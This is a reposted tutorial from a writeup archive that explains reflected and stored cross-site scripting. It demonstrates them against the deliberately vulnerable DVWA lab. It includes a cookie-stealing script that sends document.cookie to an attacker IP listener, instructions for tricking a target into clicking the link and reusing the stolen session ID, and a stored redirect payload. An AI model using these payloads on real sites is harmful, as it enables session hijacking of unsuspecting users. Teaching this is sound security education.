# :globe_with_meridians: What is Cross-Site Scripting (XSS)? Completely explained with types.

> **Original Source:** [What is Cross-Site Scripting (XSS)? Completely explained with types.](https://infosecwriteups.com/cross-site-what-is-cross-site-scripting-xss-completely-explained-with-types-c934d6ef4087)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# What is Cross-Site Scripting (XSS)? Completely explained with types.


Let’s discuss Cross-site scripting (XSS) to understand it:

*What is Cross-Site Scripting? Explained completely.*


First of all, if you are a non-member then the link below is for you to read:


Cross-site scripting (XSS for short) is a web application vulnerability that targets the users/visitors of the website. It is a client-side code injection attack.


Almost every web application nowadays allows a user to provide input. These input fields are exactly the points where you, as an attacker can inject your malicious JavaScript payload into the website. Difficult to understand? Let’s make it easy with an example.

>

Example:


Consider an example of any e-commerce website e.g., Amazon. You open up the website, you enter the keyword related to the product you are looking for and the website displays the results. That’s it. But wait, is this the only thing happening here? The answer is absolutely not. Look at the URL in the search bar. It contains the keyword you entered as the input.

*Demonstration from a live website “How Reflected XSS works?”*


And one more thing to notice, your entered keyword is displayed back on the result page as well

*Demonstration from a live website “How Reflected XSS works?”*


Now *adopting the hacker’s mindset*, I think that we have complete control over the input that we are entering here. We can enter anything in this field, literally anything. Can we enter any malicious JavaScript payload here? Of course, we can. This is what exactly cross-site scripting is. You inject a malicious payload into the input field, the payload becomes a part of the URL, you send out that URL to your targeted visitor, you trick the users to click that malicious link and in this way, you can target the visitors of the website.

>

Proof Of Concept (PoC):


You can simply enter a JavaScript code to pop up an alert window as the proof of concept.


<script> alert(“XSS”) </script>

>

Types of XSS:


Here, we will discuss two main types of Cross-Site Scripting:

### Reflected Cross-Site Scripting: -


This is the same thing that we understood in the above example. The user provides input, and that input becomes a part of the URL and also is reflected back to the result page.


How XSS can be harmful?


If you know the power of JavaScript, you can also understand the impacts of this vulnerability. You can do anything using this vulnerability that you can do with JavaScript (because you are entering JavaScript code as the payload). You will trick the users to click the malicious link, the user will click the link containing the malicious payload and the JavaScript code will be executed. You can capture cookies, you can redirect users to any site, you can make visitors download any file forcefully, and much more.


*Graphical representation of Reflected Cross-Site Scripting (Reflected XSS)*


Let’s have a deep dive into the practical implementation.


Using Kali Linux as the attacking machine and Damn Vulnerable Web Application with low security as my target.


First of all, going to check how the input field responds. Entering some random value in the input field.


*Testing input fields for reflected cross-site scripting*


Click on submit button.

*Testing input fields for reflected cross-site scripting*


We noticed that our input is now a part of the URL and is also reflected/printed back to the resulting page. Now it’s time to do something malicious here. We will perform cookies stealing using reflected XSS. The payload that I am going to use:


<script>location.href=’http://192.168.222.195:4444/abc.php?test='+document.cookie;</script>


Where 192.168.222.195 is our attacker’s machine IP address. All of the captured information will be sent out to this IP, and 4444 is the port number on which we will setup our listener for listening to the incoming traffic.


## Get Rabia Riaz’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Before injecting the payload into the website, we will setup our netcat listener for listening to the incoming traffic.


*Netcat listener listening*


Will input the payload now.


*Injecting the payload into the website*


Click on ‘Submit’.


*Payload injected into the website*


Page is in the loading state but is not loaded completely.


While the page is in the loading state, you can copy the link from the search bar.

*Got the malicious link*


Send that copied link to your target user (Windows 10 in our case). When the user clicks the link, your payload inside the link will be executed and the captured information will be sent to your netcat listener.


*Target user opened the link*


Coming back to our netcat listener.


*Target user’s session information captured into the netcat listener*


Captured information is here and what we got? PHPSESSIONID. Now you can use this session ID to login to the website as your target user.


That’s one case scenario only. You can do a lot more just by crafting the payload according to the situation. [Explore more XSS payloads from here.](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)


Stored Cross-Site Scripting: -


In this type of XSS, your input neither becomes a part of the URL nor is reflected back to the same page. In stored cross-site scripting, the attacker injects the payload at such a point that it gets stored on the website’s database and is reloaded every time any user opens up the website.


“Have you ever seen the comment section on any website or any input field where you can enter your feedback?” I can hear that your answer is YES. These are the points where you will enter your input, which will get stored on the database and will be reloaded every time someone loads the page.


*Graphical Demonstration of Stored Cross-Site Scripting*


Imagine those malicious acts that you were doing with a specific & limited number of users using reflected XSS, now can be done with every user of the website using stored XSS. Stored cross-site scripting is much more dangerous as compared to reflected cross-site scripting.


Practical Demonstration:


This time, I am going to use a locally hosted website. In this case, we will redirect users to some other website.


Used payload:


<script>window.location=’https://google.com’;</script>


Where [https://google.com](https://google.com) is the website where the users will be redirected on the execution of the payload.


*Practical demonstration of Stored Cross-Site Scripting (Submitting input)*


Click on ‘Send Message’ and we got the message of successful submission.


*Practical demonstration of Stored Cross-Site Scripting (Submitting input)*


Our given input is stored in the database.

*Practical demonstration (Submitted input saved into the database)*


And will be loaded into the feedback section of the website.


*Practical demonstration of Stored Cross-Site Scripting*


Reload this page. On reloading, we will be redirected to google.com.


*Practical demonstration of Stored Cross-Site Scripting (User redirected)*


That happened because our payload was saved in the database and got executed when we reloaded the page. Now every user who loads the feedback section of the website, will load our payload and will be redirected to google.com instead of the feedback section.

>

Conclusion:


Cross-site scripting is a web injection vulnerability through which we target the users of the website.


We discussed how XSS works, how it can be harmful, and the two main types of Cross-site scripting. We demonstrated Practically both typed of cross-site scripting.

---

*Originally published on [Medium](https://infosecwriteups.com/cross-site-what-is-cross-site-scripting-xss-completely-explained-with-types-c934d6ef4087). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
